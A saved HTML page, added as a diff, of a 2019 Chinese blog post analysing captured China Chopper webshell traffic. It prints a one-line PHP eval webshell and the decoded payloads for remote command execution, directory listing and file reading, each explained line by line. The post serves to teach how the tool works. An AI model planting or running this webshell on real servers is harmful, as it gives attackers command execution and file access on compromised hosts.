@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>中国菜刀-分析 | Elapse&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="类似前言一样得废话昨天偶然看到了中国菜刀这个词，突然发现这类软件的工作原理倒是没有好好看过，只看过pwntools的，所以难得有时间，便开着wireshark搞一手，看看发了什么玩意 首先大体分为两种，一种是读取文件的shell，一种是执行命令的shell 执行命令菜刀用的方式是这样的 第一个php马-&amp;gt;z1[post]-&amp;gt;r=z1+z2（拼接语句）           -&amp;gt;z2">
+<meta name="keywords" content="网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中国菜刀-分析">
+<meta property="og:url" content="https://Ernket.github.io/2019/10/02/zhong-guo-cai-dao-fen-xi/index.html">
+<meta property="og:site_name" content="Elapse&#39;s Blog">
+<meta property="og:description" content="类似前言一样得废话昨天偶然看到了中国菜刀这个词，突然发现这类软件的工作原理倒是没有好好看过，只看过pwntools的，所以难得有时间，便开着wireshark搞一手，看看发了什么玩意 首先大体分为两种，一种是读取文件的shell，一种是执行命令的shell 执行命令菜刀用的方式是这样的 第一个php马-&amp;gt;z1[post]-&amp;gt;r=z1+z2（拼接语句）           -&amp;gt;z2">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1570025438345.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1570025451253.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1570025542801.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1570025591589.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1570025599946.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1570025611149.png">
+<meta property="og:updated_time" content="2019-10-02T14:17:01.392Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="中国菜刀-分析">
+<meta name="twitter:description" content="类似前言一样得废话昨天偶然看到了中国菜刀这个词，突然发现这类软件的工作原理倒是没有好好看过，只看过pwntools的，所以难得有时间，便开着wireshark搞一手，看看发了什么玩意 首先大体分为两种，一种是读取文件的shell，一种是执行命令的shell 执行命令菜刀用的方式是这样的 第一个php马-&amp;gt;z1[post]-&amp;gt;r=z1+z2（拼接语句）           -&amp;gt;z2">
+<meta name="twitter:image" content="https://Ernket.github.io/post-images/1570025438345.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Elapse&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Elapse</a></h1>
+        </hgroup>
+        
+        <p class="header-subtitle">生命的质感和构造，即存在本身</p>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Python/" style="font-size: 16px;">Python</a> <a href="/tags/linux/" style="font-size: 18px;">linux</a> <a href="/tags/windows/" style="font-size: 14px;">windows</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/总结/" style="font-size: 10px;">总结</a> <a href="/tags/游戏/" style="font-size: 10px;">游戏</a> <a href="/tags/网络安全/" style="font-size: 20px;">网络安全</a> <a href="/tags/虚拟化/" style="font-size: 10px;">虚拟化</a> <a href="/tags/逆向破解/" style="font-size: 12px;">逆向破解</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.csdn.net/baidu_21483933">csdn</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://segmentfault.com/blog/maocg_web">segmentfault</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/eb37ef89c746/latest_articles">简书</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱动漫,爱游戏,爱编程,爱运动,爱的太多了!</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Elapse</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Elapse</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">生命的质感和构造，即存在本身</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-zhong-guo-cai-dao-fen-xi" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2019/10/02/zhong-guo-cai-dao-fen-xi/" class="article-date">
+      <time datetime="2019-10-02T14:05:19.000Z" itemprop="datePublished">2019-10-02</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      中国菜刀-分析
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="类似前言一样得废话"><a href="#类似前言一样得废话" class="headerlink" title="类似前言一样得废话"></a>类似前言一样得废话</h1><p>昨天偶然看到了中国菜刀这个词，突然发现这类软件的工作原理倒是没有好好看过，只看过<code>pwntools</code>的，所以难得有时间，便开着wireshark搞一手，看看发了什么玩意</p>
+<p>首先大体分为两种，一种是读取文件的shell，一种是执行命令的shell</p>
+<h1 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h1><p>菜刀用的方式是这样的</p>
+<pre><code>第一个php马-&gt;z1[post]-&gt;r=z1+z2（拼接语句）
+          -&gt;z2[post]
+          #z1为/bin/sh
+          #z2为执行所需的命令
+</code></pre><p>在第一个php马中，执行php语句，该Php语句因为过狗的关系，其中所需的值是需要通过二次post来传入的</p>
+<p>首先在菜刀中，右键选择虚拟终端<br><img src="https://Ernket.github.io/post-images/1570025438345.png" alt=""><br><img src="https://Ernket.github.io/post-images/1570025451253.png" alt=""></p>
+<p>先试着运行一个命令<code>id</code>，然后抓包分析一下</p>
+<p>这里为了方便解释，所以贴一下一句话木马，我的参数是-7</p>
+<pre><code>&lt;?php eval($_POST[-7]);?&gt;
+</code></pre><p>在第一个包中，找到菜刀发送到服务端的包</p>
+<p><img src="https://Ernket.github.io/post-images/1570025542801.png" alt=""></p>
+<p>首先它传入了第一个参数是<code>-7</code>，内容是base64，解码后可得</p>
+<pre><code>@eval (base64_decode($_POST[z0]));
+</code></pre><p>众所周知，在php中，eval函数，会将括号内的字符串，当作php语句来执行，而菜刀的做法是，在其中又套了一个一句话木马，参数为<code>z0</code></p>
+<p>然后它传入了第二个参数，参数为<code>z0</code>，内容为</p>
+<pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$p=base64_decode($_POST[&quot;z1&quot;]);$s=base64_decode($_POST[&quot;z2&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;$r=&quot;{$p} {$c}&quot;;@system($r.&quot; 2&gt;&amp;1&quot;,$ret);print ($ret!=0)?&quot;
+ret={$ret}
+&quot;:&quot;&quot;;;echo(&quot;|&lt;-&quot;);die();
+</code></pre><p>内容有点鬼畜，我们挨个分析，首先是开头的三个函数</p>
+<p>@ini_set(“display_errors”,”0”); 这个是临时关闭PHP的错误显示</p>
+<p>@set_time_limit(0); 防止执行命令的时候超时</p>
+<p>@set_magic_quotes_runtime(0); 关闭魔术引号</p>
+<p>然后就是代码部分</p>
+<pre><code>$p=base64_decode($_POST[&quot;z1&quot;]);$s=base64_decode($_POST[&quot;z2&quot;]);
+</code></pre><p>它又套了两个参数z1和z2，需要再次post传输进去</p>
+<pre><code>$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);
+</code></pre><p>$d通过<code>dirname</code>来获取父目录</p>
+<p>首先解释一下<code>$_SERVER[&quot;SCRIPT_FILENAME&quot;]</code>，这个函数的是用来读取该文件所在的位置，在这个环境中是<code>/var/www/html/elapse/file.php</code></p>
+<p>而<code>dirname</code>，则可以用来读取父目录</p>
+<p>我在上面通过<code>$_SERVER[&quot;SCRIPT_FILENAME&quot;]</code>获取到了文件路径为<code>/var/www/html/elapse/file.php</code></p>
+<p>那么dirname在读取的时候，得到的结果是<code>/var/www/html/elapse/</code></p>
+<p>然后将这个结果赋值给$d，至于这个\$d有什么用，是后话了</p>
+<p>解析来就是有意思的部分了</p>
+<pre><code>$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;$r=&quot;{$p} {$c}&quot;;
+</code></pre><p>这里要解释一下在php中?:是什么意思</p>
+<p>这个是<code>三目运算符</code>，看着很高级，其实就是条件运算符，但是为了快捷简单，于是便用这种方法来取代<code>if else</code></p>
+<p>用法如下</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">></span><span class="token variable">$b</span> <span class="token operator">?</span> <span class="token keyword">print</span> <span class="token string">"a>b"</span> <span class="token punctuation">:</span> <span class="token string">"a&lt;b"</span><span class="token punctuation">;</span>
+
+<span class="token shell-comment comment">#等价于</span>
+<span class="token variable">$if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">></span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token keyword">print</span><span class="token string">"a>b"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">print</span><span class="token string">"a&lt;b"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>回到代码上</p>
+<pre><code>$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;$
+</code></pre><p>这里的</p>
+<pre><code>substr($d,0,1)==&quot;/&quot;
+</code></pre><p>为条件，如果这个路径的第一位为/，那么这个条件就是true，为真，然后他就会执行<code>?</code>后面的东西，然后将执行的语句拼合起来</p>
+<p>执行的语句我们看回z2</p>
+<pre><code>cd &quot;/var/www/html/elapse/&quot;;id;echo [S];pwd;echo [E]
+</code></pre><p>在数据包中，我们还发现了一个z2参数，这个参数是接下来要在对方机器所需要执行的命令，内容如下</p>
+<pre><code>cd &quot;/var/www/html/elapse/&quot;;id;echo [S];pwd;echo [E]
+</code></pre><p>$d的内容拼接到了cd 后面，然后执行你在虚拟终端中给的命令，接着输出一个<code>[S]</code>来区分命令，最后，执行pwd，查看当前路径，然后保存下来，供下一条命令cd用，这样就能做到实时切换目录了，不会因为这次操作了，下一次路径又回到之前的</p>
+<pre><code>$r=&quot;{$p} {$c}&quot;;@system($r.&quot; 2&gt;&amp;1&quot;,$ret);print ($ret!=0)?&quot;
+ret={$ret}
+</code></pre><p>接着就到了执行语句的部分,$r的内容为是拼接的，\$c为执行语句，而\$p则是参数z1传入的，内容为<code>/bin/sh</code>，拼在一起就是</p>
+<pre><code>/bin/sh -c cd &quot;/var/www/html/elapse/&quot;;id;echo [S];pwd;echo [E]
+</code></pre><p>然后<code>2&gt;&amp;1</code>将无用的信息丢到垃圾桶里去,接着放到判断里，如果不是空的，那么就赋值过去，如果是空的，那就啥都不输出</p>
+<p>总结一下，就是</p>
+<pre><code>1.通过一句话木马传入新得php语句
+2.通过该php语句传入真正的执行命令的语句
+3.传入上一条2的php语句中所需要的参数使其能正常工作，有/bin/sh和cd /var/www/;等命令
+4.将执行结果返还给你
+</code></pre><h1 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h1><p>查看文件的Shell则比执行命令来的简单一些</p>
+<p><img src="https://Ernket.github.io/post-images/1570025591589.png" alt=""></p>
+<p>这里分两个，一个是读取文件夹内容的，一个是读取文件内容的，先说文件夹的</p>
+<p><img src="https://Ernket.github.io/post-images/1570025599946.png" alt=""></p>
+<p>以下为解码的主要内容</p>
+<pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL){echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;
+&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(&quot;|&lt;-&quot;);die();
+</code></pre><p>首先还是老套路通过<code>$D=base64_decode($_POST[&quot;z1&quot;]);</code>来传入一个路径，该路径为你在菜刀中双击选择的路径（或者为默认的文件所在路径）</p>
+<p>获取到了之后，通过<code>$F=@opendir($D);</code>来获取文件夹下的文件名，如果路径不存在，那么</p>
+<pre><code>if($F==NULL){echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);}
+</code></pre><p>发送报错，提示路径不存在</p>
+<p>否则的话就</p>
+<pre><code>$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;
+&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};
+</code></pre><p>通过while循环读取内容，路径怎么来的呢，<code>$P=$D.&quot;/&quot;.$N;</code>拼合来的</p>
+<p>后面就很人性化的写出了文件创建、修改的时间</p>
+<p><img src="https://Ernket.github.io/post-images/1570025611149.png" alt=""></p>
+<pre><code>$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));
+</code></pre><p>然后通过函数<code>fileperms</code>返回文件权限</p>
+<pre><code>@$E=substr(base_convert(@fileperms($P),10,8),-4);
+</code></pre><p>这里的<code>substr(x,10,8),-4)</code>的意思是，只显示x内容的前10位，然后只显示8个字符，最后从后往前数4位，最后得到了对应的权限</p>
+<p><code>0644</code></p>
+<p>以及</p>
+<pre><code>if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;}
+</code></pre><p>对该文件是文件还是文件夹做的判断</p>
+<p>最后全部echo出来</p>
+<p>菜刀，很细节，好吧</p>
+<p>文件读取呢，比较弱智，代码是这样的</p>
+<pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$F=base64_decode($_POST[&quot;z1&quot;]);$P=@fopen($F,&quot;r&quot;);echo(@fread($P,filesize($F)));@fclose($P);;echo(&quot;|&lt;-&quot;);die();
+</code></pre><p>就是fopen打开来读取然后关闭，没了</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2019/10/02/zhong-guo-cai-dao-fen-xi/">中国菜刀-分析</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 Elapse 的个人博客">Elapse</a></p>
+        <p><span>发布时间:</span>2019年10月02日 - 22时05分</p>
+        <p><span>最后更新:</span>2019年10月02日 - 22时17分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/10/02/zhong-guo-cai-dao-fen-xi/" title="中国菜刀-分析">https://Ernket.github.io/2019/10/02/zhong-guo-cai-dao-fen-xi/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://Ernket.github.io/2019/10/02/zhong-guo-cai-dao-fen-xi/　　作者: Elapse" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2019/10/10/ji-yu-python3-de-mu-ma-lian-jie-gong-ju-bian-xie/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          基于Python3的木马连接工具编写
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2019/08/15/wang-lu-yu-xin-xi-an-quan-ling-yu-zhuan-xiang-sai-web-writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">网路与信息安全领域专项赛-Web Writeup</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#类似前言一样得废话"><span class="toc-number">1.</span> <span class="toc-text">类似前言一样得废话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#执行命令"><span class="toc-number">2.</span> <span class="toc-text">执行命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查看文件"><span class="toc-number">3.</span> <span class="toc-text">查看文件</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2019/10/10/ji-yu-python3-de-mu-ma-lian-jie-gong-ju-bian-xie/" title="上一篇: 基于Python3的木马连接工具编写">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2019/08/15/wang-lu-yu-xin-xi-an-quan-ling-yu-zhuan-xiang-sai-web-writeup/" title="下一篇: 网路与信息安全领域专项赛-Web Writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/24/rhcenotescollation/">RHCE培训笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/ji-yu-python3-de-mu-ma-lian-jie-gong-ju-bian-xie/">基于Python3的木马连接工具编写</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/02/zhong-guo-cai-dao-fen-xi/">中国菜刀-分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/15/wang-lu-yu-xin-xi-an-quan-ling-yu-zhuan-xiang-sai-web-writeup/">网路与信息安全领域专项赛-Web Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/10/minuv1-ba-ji-shen-tou/">MinUv1靶机渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/07/de1ctf-ssrf-me_writeup/">De1CTF-SSRF Me_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/31/2019强网杯Upload题Writeup/">2019强网杯Upload题Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/24/php-serialize/">PHP反序列化漏洞学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/18/python3-qi-dian-zhong-wen-wang-pa-chong/">Python3 起点中文网爬虫</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/21/untiy-yin-qing-you-xi-dian-jing-da-heng-ni-xiang/">Untiy引擎-游戏电竞大亨逆向</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/06/friends/">友情链接</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/basic-pentesting2-ba-ji-shen-tou/">Basic-pentesting2靶机渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/about/">About</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/25/Machine_matrix 渗透笔记/">Machine_matrix靶机渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/2018总结/">2018的一个小总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/2018zongjie/">2018的一个小总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/29/Python3多线程/">Python3多线程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/22/Web条件竞争利用/">Web条件竞争利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/11/Python3栅栏密码解密/">Python3栅栏密码解密</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/28/macos虚拟机安装/">虚拟机安装MacOS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/22/Python爬取steam优惠/">Python爬取steam优惠</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/13/Python3调用Google翻译/">Python3调用Google翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/18/2018kali更新源/">2018Kali可用更新源</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/12/CH4INRULZ_v1.0.1靶机攻略/">CH4INRULZ_v1.0.1靶机攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/31/“深海迷航” 为期两个星期的深海探险 完结/">“深海迷航” 为期两个星期的深海探险 完结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/basci-pentesting2靶机渗透/">Basic-pentesting2靶机渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/Vulnhub TrollCave CTF靶机渗透/">JIS-CTF Vulnhub TrollCave CTF靶机渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/29/JIS-CTF BOB靶机渗透笔记/">JIS-CTF BOB靶机渗透笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/27/JIS-CTF靶机渗透笔记/">JIS-CTF靶机渗透笔记</a></li><li 